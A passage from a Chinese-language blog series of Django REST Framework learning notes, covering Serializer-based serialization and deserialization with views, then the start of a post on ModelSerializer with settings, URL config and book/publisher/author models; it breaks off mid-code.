<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> serializers, exceptions</span><br><span class="line"><span class="keyword">from</span> django.conf <span class="keyword">import</span> settings</span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserSerializer</span><span class="params">(serializers.Serializer)</span>:</span>   <span class="comment">#创建一个序列化类</span></span><br><span class="line">    name = serializers.CharField()      </span><br><span class="line">    phone = serializers.CharField()</span><br><span class="line">    <span class="comment"># 序列化提供给前台的字段个数由后台决定，可以少提供，但是提供的数据库对应的字段，名字一定要与数据库字段相同</span></span><br><span class="line">    <span class="comment"># sex = serializers.IntegerField()</span></span><br><span class="line">    <span class="comment"># icon = serializers.ImageField()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 自定义序列化属性</span></span><br><span class="line">    <span class="comment"># 属性名随意，值由固定的命名规范方法提供:</span></span><br><span class="line">    <span class="comment">#       get_属性名(self, 参与序列化的model对象)</span></span><br><span class="line">    <span class="comment">#       返回值就是自定义序列化属性的值</span></span><br><span class="line">    gender = serializers.SerializerMethodField()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_gender</span><span class="params">(self, obj)</span>:</span></span><br><span class="line">        <span class="comment"># choice类型的解释型值 get_字段_display() 来访问</span></span><br><span class="line">        <span class="keyword">return</span> obj.get_sex_display()</span><br><span class="line"></span><br><span class="line">　　 <span class="comment">#自定义序列化属性icon</span></span><br><span class="line">    icon = serializers.SerializerMethodField()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_icon</span><span class="params">(self, obj)</span>:</span></span><br><span class="line">        <span class="comment"># settings.MEDIA_URL: 自己配置的 /media/，给后面高级序列化与视图类准备的</span></span><br><span class="line">        <span class="comment"># obj.icon不能直接作为数据返回，因为内容虽然是字符串，但是类型是ImageFieldFile类型</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'%s%s%s'</span> % (<span class="string">r'http://127.0.0.1:8000'</span>, settings.MEDIA_URL, str(obj.icon))</span><br></pre></td></tr></table></figure>
<h4 id="视图层-views.py">视图层 <code>views.py</code></h4>
<ol type="1">
<li>从数据库中将要序列化给前台的<code>model</code>对象，或是多个<code>model</code>对象查询出来</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">user_obj = models.User.objects.get(pk=pk)</span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">user_obj_list = models.User.objects.all()</span><br></pre></td></tr></table></figure>
<ol start="2" type="1">
<li>序列化: <code>对象.data</code> 就是可以返回给前台的序列化数据</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> Response(&#123;</span><br><span class="line">    <span class="string">'status'</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">'msg'</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">'results'</span>: user_ser.data</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>完整代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        pk = kwargs.get(<span class="string">'pk'</span>)</span><br><span class="line">        <span class="keyword">if</span> pk:  <span class="comment">#单查</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># 用户对象不能直接作为数据返回给前台</span></span><br><span class="line">                user_obj = models.User.objects.get(pk=pk)</span><br><span class="line">                <span class="comment"># 序列化一下用户对象</span></span><br><span class="line">                user_ser = serializers.UserSerializer(user_obj)</span><br><span class="line">                <span class="keyword">return</span> Response(&#123;</span><br><span class="line">                    <span class="string">'status'</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="string">'msg'</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="string">'results'</span>: user_ser.data   <span class="comment">#如果你在序列化的时候没有.data,那么在传给前端的时候必须要.data</span></span><br><span class="line">                &#125;)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">return</span> Response(&#123;</span><br><span class="line">                    <span class="string">'status'</span>: <span class="number">2</span>,</span><br><span class="line">                    <span class="string">'msg'</span>: <span class="string">'用户不存在'</span>,</span><br><span class="line">                &#125;)</span><br><span class="line">        <span class="keyword">else</span>:  <span class="comment">#群查</span></span><br><span class="line">            <span class="comment"># 用户对象列表(queryset)不能直接作为数据返回给前台</span></span><br><span class="line">            user_obj_list = models.User.objects.all()</span><br><span class="line">            <span class="comment"># 序列化一下用户对象</span></span><br><span class="line">            user_ser_data = serializers.UserSerializer(user_obj_list, many=<span class="literal">True</span>).data</span><br><span class="line">            <span class="keyword">return</span> Response(&#123;</span><br><span class="line">                <span class="string">'status'</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="string">'msg'</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="string">'results'</span>: user_ser_data</span><br><span class="line">            &#125;)</span><br></pre></td></tr></table></figure>
<h3 id="反序列化">反序列化</h3>
<h4 id="反序列层-apiserializers.py">反序列层 <code>api/serializers.py</code></h4>
<ol type="1">
<li>设置必填与选填序列化字段，设置校验规则</li>
<li>为需要额外校验的字段提供局部钩子函数，如果该字段不入库，且不参与全局钩子校验，可以将值取出校验 <code>pop</code></li>
<li>为有联合关系的字段们提供全局钩子函数，如果某些字段不入库，可以将值取出校验</li>
<li><strong>必须重写<code>create</code>方法，完成校验通过的数据入库工作，得到新增的对象</strong></li>
</ol>
<p>完整代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserDeserializer</span><span class="params">(serializers.Serializer)</span>:</span></span><br><span class="line">    <span class="comment"># 1) 哪些字段必须反序列化</span></span><br><span class="line">    <span class="comment"># 2) 字段都有哪些安全校验</span></span><br><span class="line">    <span class="comment"># 3) 哪些字段需要额外提供校验  钩子函数</span></span><br><span class="line">    <span class="comment"># 4) 哪些字段间存在联合校验</span></span><br><span class="line">    <span class="comment"># 注：反序列化字段都是用来入库的，不会出现自定义方法属性，会出现可以设置校验规则的自定义属性,不入数据库的</span></span><br><span class="line">    name = serializers.CharField(</span><br><span class="line">        max_length=<span class="number">64</span>,</span><br><span class="line">        min_length=<span class="number">3</span>,</span><br><span class="line">        error_messages=&#123;</span><br><span class="line">            <span class="string">'max_length'</span>: <span class="string">'太长'</span>,</span><br><span class="line">            <span class="string">'min_length'</span>: <span class="string">'太短'</span></span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line">    pwd = serializers.CharField()</span><br><span class="line">    phone = serializers.CharField(required=<span class="literal">False</span>)</span><br><span class="line">    sex = serializers.IntegerField(required=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 自定义有校验规则的反序列化字段,例如确认密码字段re_pwd</span></span><br><span class="line">    re_pwd = serializers.CharField(required=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 小结：</span></span><br><span class="line">    <span class="comment"># name，pwd，re_pwd为必填字段</span></span><br><span class="line">    <span class="comment"># phone，sex为选填字段</span></span><br><span class="line">    <span class="comment"># 五个字段都必须提供完成的校验规则</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 局部钩子：validate_要校验的字段名(self, 当前要校验字段的值)</span></span><br><span class="line">    <span class="comment"># 校验规则：校验通过返回原值，校验失败，抛出异常</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate_name</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'g'</span> <span class="keyword">in</span> value.lower():  <span class="comment"># 名字中不能出现g</span></span><br><span class="line">            <span class="keyword">raise</span> exceptions.ValidationError(<span class="string">'名字非法，是个鸡贼！'</span>)</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 全局钩子：validate(self, 通过系统与局部钩子校验之后的所有数据)</span></span><br><span class="line">    <span class="comment"># 校验规则：校验通过返回原值，校验失败，抛出异常</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate</span><span class="params">(self, attrs)</span>:</span>    <span class="comment">#attrs是字典格式</span></span><br><span class="line">        pwd = attrs.get(<span class="string">'pwd'</span>)</span><br><span class="line">        re_pwd = attrs.pop(<span class="string">'re_pwd'</span>)     <span class="comment">#因为re_pwd不需要入数据库，所以在全局钩子校验中删除掉这个字段</span></span><br><span class="line">        <span class="keyword">if</span> pwd != re_pwd:</span><br><span class="line">            <span class="keyword">raise</span> exceptions.ValidationError(&#123;<span class="string">'pwd&amp;re_pwd'</span>: <span class="string">'两次密码不一致'</span>&#125;)</span><br><span class="line">        <span class="keyword">return</span> attrs</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 要完成新增，必须自己重写 create 方法，validated_data是校验的数据</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(self, validated_data)</span>:</span></span><br><span class="line">        <span class="comment"># 尽量在所有校验规则完毕之后，数据可以直接入库</span></span><br><span class="line">        <span class="keyword">return</span> models.User.objects.create(**validated_data)</span><br></pre></td></tr></table></figure>
<h4 id="视图层-views.py-1">视图层 views.py</h4>
<ol type="1">
<li>反序列化数据必须赋值<code>data</code>，结果就是得到一个<code>serializer</code>对象</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">book_ser = serializers.UserDeserializer(data=request_data)</span><br></pre></td></tr></table></figure>
<ol start="2" type="1">
<li>把数据放到自定义<code>serializer</code>中校验，数据校验成功返回<code>True</code>,失败返回<code>False</code></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">book_ser.is_valid()</span><br></pre></td></tr></table></figure>
<ol start="3" type="1">
<li>不通过返回 <code>book_ser.errors</code> 给前台，通过 <code>book_ser.save()</code> 得到新增的对象，再正常返回</li>
</ol>
<p>完整代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="comment"># 只考虑单增</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="comment"># 请求数据</span></span><br><span class="line">        request_data = request.data</span><br><span class="line">        <span class="comment"># 数据是否合法（增加对象需要一个字典数据）</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> isinstance(request_data, dict) <span class="keyword">or</span> request_data == &#123;&#125;:</span><br><span class="line">            <span class="keyword">return</span> Response(&#123;</span><br><span class="line">                <span class="string">'status'</span>: <span class="number">1</span>,</span><br><span class="line">                <span class="string">'msg'</span>: <span class="string">'数据有误'</span>,</span><br><span class="line">            &#125;)</span><br><span class="line">        <span class="comment"># 数据类型合法，但数据内容不一定合法，需要校验数据，校验(参与反序列化)的数据需要赋值给data</span></span><br><span class="line">        book_ser = serializers.UserDeserializer(data=request_data)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 序列化对象调用is_valid()完成校验，校验失败的失败信息都会被存储在 序列化对象.errors</span></span><br><span class="line">        <span class="keyword">if</span> book_ser.is_valid():</span><br><span class="line">            <span class="comment"># 校验通过，完成新增</span></span><br><span class="line">            book_obj = book_ser.save()</span><br><span class="line">            <span class="keyword">return</span> Response(&#123;</span><br><span class="line">                <span class="string">'status'</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="string">'msg'</span>: <span class="string">'ok'</span>,</span><br><span class="line">                <span class="string">'results'</span>: serializers.UserSerializer(book_obj).data</span><br><span class="line">            &#125;)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 校验失败</span></span><br><span class="line">            <span class="keyword">return</span> Response(&#123;</span><br><span class="line">                <span class="string">'status'</span>: <span class="number">1</span>,</span><br><span class="line">                <span class="string">'msg'</span>: book_ser.errors,</span><br><span class="line">            &#125;)</span><br></pre></td></tr></table></figure>
<h1 id="总结">总结</h1>
<ol type="1">
<li>使用序列化器的时候一定要注意，序列化器声明了以后，不会自动执行，需要我们在视图中进行调用才可以</li>
<li>序列化器无法直接接收数据，需要我们在视图中创建序列化器对象时把使用的数据传递过来。（<code>data</code>, <code>instance</code>传参）
<ul>
<li>序列化：是数据对象从数据库中查出，通过instance传入序列化器中，必须通过data属性才能将序列化后的数据传给前端，不能直接传序列化对象</li>
<li>反序列化：是数据是通过request.data从前端获取到数据，通过data传入序列化器中进行校验，保存到数据库中</li>
</ul></li>
<li>序列化器的字段声明类似于我们前面使用过的表单系统</li>
<li>开发restful api时，序列化器会帮我们把模型数据转换成字典</li>
<li>drf提供的视图会帮我们把字典转换成json，或者把客户端发过来的数据转换成字典</li>
</ol>
]]></content>
      <categories>
        <category>Tech</category>
      </categories>
      <tags>
        <tag>Learning Notes</tag>
        <tag>Tech</tag>
        <tag>Dev</tag>
        <tag>Backend</tag>
        <tag>Django</tag>
        <tag>Django REST Framework</tag>
        <tag>DRF</tag>
      </tags>
  </entry>
  <entry>
    <title>Django REST Framework 学习笔记（八）：序列化模块 serialziers 之 ModelSerializer类</title>
    <url>/tech/drf-learning-notes-8-the-modelserializer-class-in-serialziers-module/</url>
    <content><![CDATA[<ul>
<li>Title(EN): <em><strong>Django REST Framework Learning Notes (8): the ModelSerializer class in serialziers module</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr />
<h1 id="基本信息">基本信息</h1>
<ul>
<li>源码：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VuY29kZS9kamFuZ28tcmVzdC1mcmFtZXdvcmsvYmxvYi9tYXN0ZXIvcmVzdF9mcmFtZXdvcmsvc2VyaWFsaXplcnMucHk=">rest_framework.serializers<i class="fa fa-external-link-alt"></i></span></li>
<li>官方文档
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvc2VyaWFsaXplcnMv">API Guild - Serializers<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvZmllbGRzLw==">API Guild - Serializer fields<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvcmVsYXRpb25zLw==">API Guild - Serializer relations<i class="fa fa-external-link-alt"></i></span></li>
</ul></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hlbGxvX2RyZi90cmVlL21hc3Rlci9ubzhfZHJmX01vZGVsU2VyaWFsaXplcg==">本文demo代码Github<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>DRF常用序列化类主要有</p>
<ul>
<li><code>rest_framework.serialziers.Serializer</code></li>
<li><code>rest_framework.serialziers.ModelSerializer</code></li>
<li><code>rest_framework.serialziers.ListSerializer</code></li>
</ul>
<p>本篇介绍<code>rest_framework.serialziers.ModelSerializer</code> ，将结合图书管理系统实例说明。</p>
<a id="more"></a>
<h1 id="序列化以外的其他配置">序列化以外的其他配置</h1>
<h2 id="settings.py"><code>settings.py</code></h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">INSTALLED_APPS = [</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    <span class="string">'rest_framework'</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">LANGUAGE_CODE = <span class="string">'zh-hans'</span></span><br><span class="line">TIME_ZONE = <span class="string">'Asia/Shanghai'</span></span><br><span class="line">USE_I18N = <span class="literal">True</span></span><br><span class="line">USE_L10N = <span class="literal">True</span></span><br><span class="line">USE_TZ = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">MEDIA_URL = <span class="string">'/media/'</span></span><br><span class="line">MEDIA_ROOT = os.path.join(BASE_DIR, <span class="string">'media'</span>)</span><br></pre></td></tr></table></figure>
<h2 id="全局url.py">全局<code>url.py</code></h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path, include</span><br><span class="line"><span class="keyword">from</span> django.conf <span class="keyword">import</span> settings</span><br><span class="line"><span class="keyword">from</span> django.conf.urls.static <span class="keyword">import</span> static</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'admin/'</span>, admin.site.urls),</span><br><span class="line">    path(<span class="string">'api/'</span>, include(<span class="string">'api.urls'</span>)),</span><br><span class="line">] + static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)</span><br></pre></td></tr></table></figure>
<h2 id="数据库表">数据库表</h2>
<h3 id="表一览">表一览</h3>
<ul>
<li><code>BaseModel</code>基表：<code>is_delete</code>、<code>create_time</code></li>
</ul>
<p>下面四表继承基表，可以继承两个字段</p>
<ul>
<li><code>Book</code>表：<code>name</code>、<code>price</code>、<code>img</code>、<code>authors</code>、<code>publish</code>、<code>is_delete</code>、<code>create_time</code></li>
<li><code>Publish</code>表：<code>name</code>、<code>address</code>、<code>is_delete</code>、<code>create_time</code></li>
<li><code>Author表</code>：<code>name</code>、<code>age</code>、<code>is_delete</code>、<code>create_time</code></li>
<li><code>AuthorDetail</code>表：<code>mobile, author</code>、<code>is_delete</code>、<code>create_time</code></li>
</ul>
<h3 id="基表代码">基表代码</h3>
<p><code>models.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseModel</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    is_delete = models.BooleanField(default=<span class="literal">False</span>)</span><br><span class="line">    create_time = models.DateTimeField(auto_now_add=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 设置 abstract = True 来声明基表，作为基表的Model不能在数据库中形成对应的表</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        abstract = <span class="literal">True</span></span><br></pre></td></tr></table></figure>
<h3 id="断关联多表关系重点">断关联多表关系（重点）</h3>
<ol type="1">
<li>外键位置：</li>
</ol>
<ul>
<li>一对多：外键放多的一方</li>
<li>一对一：从逻辑正反向考虑，如作者表与作者详情表，作者删除级联作者详情也删除，详情删除作者依旧存在，所以建议外键在详情表中（和之前的一对一关系外键放置不一样，之前都是把外键放在查询频率高的表）</li>
<li>多对多：外键在关系表中</li>
</ul>
<ol start="2" type="1">
<li>ORM正向方向连表查找：(注：依赖代码见下方)
<ul>
<li>正向：通过外键字段 eg: <code>author_detial_obj.author</code>，外键设置在作者详情表，在作者详情表中查询作者直接<code>.author</code>就可以</li>
<li>反向：通过设置反向查询<code>related_name</code>的值 eg：<code>author_obj.detail</code>，外键没有设置在作者表中，在作者表中通过设置反向查询<code>.detail</code>查询作者详情</li>
</ul></li>
<li>连表操作关系：（注：拿作者与作者详情表举例，外键建在作者详情表中）
<ul>
<li>作者删除，详情级联 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">on_delete=models.CASCADE    <span class="comment">#跟着一起删除</span></span><br></pre></td></tr></table></figure></li>
<li>作者删除，详情置空 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">null=<span class="literal">True</span>, on_delete=models.SET_NULL   <span class="comment">#外键字段清空</span></span><br></pre></td></tr></table></figure></li>
<li>作者删除，详情重置 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">default=<span class="number">0</span>, on_delete=models.SET_DEFAULT</span><br></pre></td></tr></table></figure></li>
<li>作者删除，详情不动 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">on_delete=models.DO_NOTHING</span><br></pre></td></tr></table></figure></li>
</ul></li>
<li>外键关联字段的参数：如何实现断关联、目前表间操作关系、方向查询字段
<ol type="1">
<li>作者详情表中的（外键设置在作者详情表中） <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">author = models.OneToOneField(</span><br><span class="line">    to=<span class="string">'Author'</span>,       <span class="comment">#和作者表关联</span></span><br><span class="line">    related_name=<span class="string">'detail'</span>,   <span class="comment">#反查询，作者表直接查作者详情表的电话号码，可以直接author_obj.detail.mobile</span></span><br><span class="line">    db_constraint=<span class="literal">False</span>,     <span class="comment">#断关联</span></span><br><span class="line">    on_delete=models.CASCADE  <span class="comment">#级联删除</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure></li>
<li>图书表中的 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">publish = models.ForeignKey(</span><br><span class="line">    to=<span class="string">'Publish'</span>,</span><br><span class="line">    related_name=<span class="string">'books'</span>,</span><br><span class="line">    db_constraint=<span class="literal">False</span>,</span><br><span class="line">    on_delete=models.DO_NOTHING,</span><br><span class="line">)</span><br><span class="line">authors = models.ManyToManyField(</span><br><span class="line">    to=<span class="string">'Author'</span></span><br><span class="line">    related_name=<span class="string">'books'</span>,</span><br><span class="line">    db_constraint=<span class="literal">False</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure></li>
</ol></li>
</ol>
<div class="note warning">
            <p>注意：</p><ul><li><code>ManyToManyField</code>不能设置<code>on_delete</code></li><li><code>OneToOneField</code>、<code>ForeignKey</code>必须设置<code>on_delete</code>（django1.x系统默认级联，但是django2.x必须手动明确）</li></ul>
          </div>
<h3 id="各表代码">各表代码</h3>
<details>
<p><summary> models.py </summary></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="comment"># 基类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseModel</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    is_delete = models.BooleanField(default=<span class="literal">False</span>)  <span class="comment"># 默认不是删除，数据库中是0/1</span></span><br><span class="line">    create_time = models.DateTimeField(auto_now_add=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 设置 abstract = True 来声明基表，作为基表的Model不能在数据库中形成对应的表</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        abstract = <span class="literal">True</span>  <span class="comment"># 声明该表只是一个抽象表不出现在数据库中</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 书籍表</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Book</span><span class="params">(BaseModel)</span>:</span></span><br><span class="line">    name = models.CharField(max_length=<span class="number">64</span>)</span><br><span class="line">    price = models.DecimalField(max_digits=<span class="number">5</span>, decimal_places=<span class="number">2</span>)</span><br><span class="line">    img = models.ImageField(upload_to=<span class="string">'img'</span>, default=<span class="string">'default.jpg'</span>)</span><br><span class="line">    <span class="comment"># 关联出版社表</span></span><br><span class="line">    publish = models.ForeignKey(</span><br><span class="line">        to=<span class="string">'Publish'</span>,  <span class="comment"># 关联publish表</span></span><br><span class="line">        db_constraint=<span class="literal">False</span>,  <span class="comment"># 断关联（断开Book表和Publish表的关联,方便删数据,虽然断开了关联但是还能正常使用）</span></span><br><span class="line">        related_name=<span class="string">'books'</span>,  <span class="comment"># 反向查询字段：publish_obj.books就能查出当前出版社出版的的所有书籍</span></span><br><span class="line">        on_delete=models.DO_NOTHING,  <span class="comment"># 设置连表操作关系</span></span><br><span class="line">    )</span><br><span class="line">    <span class="comment"># 关联作者表</span></span><br><span class="line">    authors = models.ManyToManyField(</span><br><span class="line">        to=<span class="string">'Author'</span>,</span><br><span class="line">        db_constraint=<span class="literal">False</span>,  <span class="comment"># 断开关联</span></span><br><span class="line">        related_name=<span class="string">'books'</span>,  <span class="comment"># 反向查询字段</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 序列化插拔式属性 - 完成自定义字段名完成连表查询</span></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">publish_name</span><span class="params">(self)</span>:</span>  <span class="comment"># 自定义查询出版社名字</span></span><br><span class="line">        <span class="keyword">return</span> self.publish.name</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">author_list</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.authors.values(<span class="string">'name'</span>, <span class="string">'age'</span>, <span class="string">'detail__mobile'</span>).all()</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        db_table = <span class="string">'book'</span></span><br><span class="line">        verbose_name = <span class="string">'书籍'</span></span><br><span class="line">        verbose_name_plural = verbose_name</span><br><span class="line"></span><br><span class="line">        unique_together = (<span class="string">'name'</span>, <span class="string">'publish'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 出版社表</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Publish</span><span class="params">(BaseModel)</span>:</span></span><br><span class="line">    <span class="string">"""name、address、is_delete、create_time"""</span></span><br><span class="line">    name = models.CharField(max_length=<span class="number">64</span>)</span><br><span class="line">    address = models.CharField(max_length=<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        db_table = <span class="string">'publish'</span></span><br><span class="line">        verbose_name = <span class="string">'出版社'</span></span><br><span class="line">        verbose_name_plural = verbose_name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 作者表</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Author</span><span class="params">(BaseModel)</span>:</span></span><br><span class="line">    <span class="string">"""name、age、is_delete、create_time"""</span></span><br><span class="line">    name = models.CharField(max_length=<span class="number">64</span>)</span><br><span class="line">    age = models.IntegerField()</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        db_table = <span class="string">'author'</span></span><br><span class="line">        verbose_name = <span class="string">'作者'</span></span><br><span class="line">        verbose_name_plural = verbose_name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 作者详情</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AuthorDetail</span><span class="params">(BaseModel)</span>:</span></span><br><span class="line">    <span class="string">"""mobile, author、is_delete、create_time"""</span></span><br><span class="line">    mobile = models.CharField(max_length=<span class="number">11</span>)</span><br><span class="line">    author = models.OneToOneField(</span><br><span class="line">        to=<span class="string">'Author'</span>,</span><br><span class="line">        db_constraint=<span class="literal">False</span>,</span><br><span class="line">        related_name=<span class="string">'detail'</span>,</span><br><span class="line">        on_delete=models.CASCADE</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        db_table = <span class="string">'author_detail'</span></span><br><span class="line">        verbose_name = <span class="string">'作者详情'</span></span><br><span class="line">        verbose_name_plural = verbose_name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.author.name</span><br></pre></td></tr></table></figure>
</details>
<h1 id="serializers.modelserializer">serializers.ModelSerializer</h1>
<h2 id="序列化-反序列化">序列化 &amp; 反序列化</h2>
<h3 id="序列化">序列化</h3>
<p><code>ModelSerializer</code>模型类序列化器与常规的<code>Serializer</code>相同，但提供了：</p>
<ol type="1">
<li>基于模型类自动生成一系列字段</li>
<li>包含默认的<code>create()</code>和<code>update()</code>的实现</li>
<li>基于模型类自动为<code>Serializer</code>生成<code>validators</code>，比如<code>unique_together</code></li>
</ol>
<h4 id="序列化层-apiserializers.py">序列化层 <code>api/serializers.py</code></h4>
<details>
<p><summary> <b><i>Source Code</i></b> </summary></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.serializers <span class="keyword">import</span> ModelSerializer, SerializerMethodField</span><br><span class="line"><span class="keyword">from</span> rest_framework.exceptions <span class="keyword">import</span> ValidationError</span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以单独作为Publish接口的序列化类，也可以作为Book序列化外键publish辅助的序列化组件</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PublishModelSerializer</span><span class="params">(ModelSerializer)</span>:</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        model = models.Publish</span><br><span class="line">        fields = (<span class="string">'name'</span>, <span class="string">'address'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Book接口序列化</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span 